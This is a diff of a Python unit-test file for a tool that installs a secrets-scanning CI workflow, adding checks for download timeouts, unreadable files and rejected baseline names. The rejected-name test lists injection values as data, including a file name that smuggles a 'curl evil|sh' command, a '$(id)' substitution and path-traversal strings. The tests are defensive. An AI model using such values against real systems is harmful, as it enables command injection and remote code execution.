@@ -1,6 +1,7 @@
 """Tests of the secrets workflow template and its writer (SPEC-0024) on text, with no external tools."""
 from __future__ import annotations
 
+import os
 import re
 import shutil
 import sys
@@ -30,6 +31,9 @@ class TemplateTests(unittest.TestCase):
         self.assertRegex(TEXT, r'SHA256: "[0-9a-f]{64}"')
         self.assertIn("sha256sum -c", TEXT)
         self.assertNotIn("gitleaks-action", TEXT)
+        # SPEC-0024/FM-10: bounded download and job
+        for needle in ("--connect-timeout", "--max-time", "--retry 3", "timeout-minutes: 15"):
+            self.assertIn(needle, TEXT)
 
     def test_scans_the_range_of_each_event_with_the_baseline(self):
         # verifies: SPEC-0024/AC-09
@@ -63,10 +67,26 @@ class WriterTests(unittest.TestCase):
         self.assertEqual(secretci.install(self.root, "b.json"), "foreign")
         self.assertEqual(path.read_text(), "name: mine\n")
 
+    def test_an_unsafe_baseline_or_an_unreadable_file_is_reported_not_raised(self):
+        # verifies: SPEC-0024/AC-11
+        # verifies: SPEC-0024/FM-12
+        path = self.root / secretci.WORKFLOW
+        path.parent.mkdir(parents=True)
+        path.write_text(secretci.render("ok.json"), encoding="utf-8")
+        self.assertEqual(secretci.state(self.root, "bad name.json"), "invalid")
+        self.assertEqual(secretci.install(self.root, "ok.json"), "current")
+        path.chmod(0)
+        try:
+            if os.access(path, os.R_OK):  # running as root: the permission cannot be dropped
+                self.skipTest("file permissions are not enforced")
+            self.assertEqual(secretci.state(self.root, "ok.json"), "invalid")
+        finally:
+            path.chmod(0o644)
+
     def test_unsafe_baseline_is_refused_and_nothing_is_written(self):
         # verifies: SPEC-0024/AC-11
         # verifies: SPEC-0024/FM-07
-        for value in ("a b.json", "x'; curl evil|sh; '", "$(id).json", "a\nb", "é.json", ""):
+        for value in ("a b.json", "x'; curl evil|sh; '", "$(id).json", "a\nb", "é.json", "", "-x.json", "a/../b.json", "../x"):
             with self.assertRaises(MthError, msg=value):
                 secretci.install(self.root, value)
         self.assertFalse((self.root / ".github").exists())
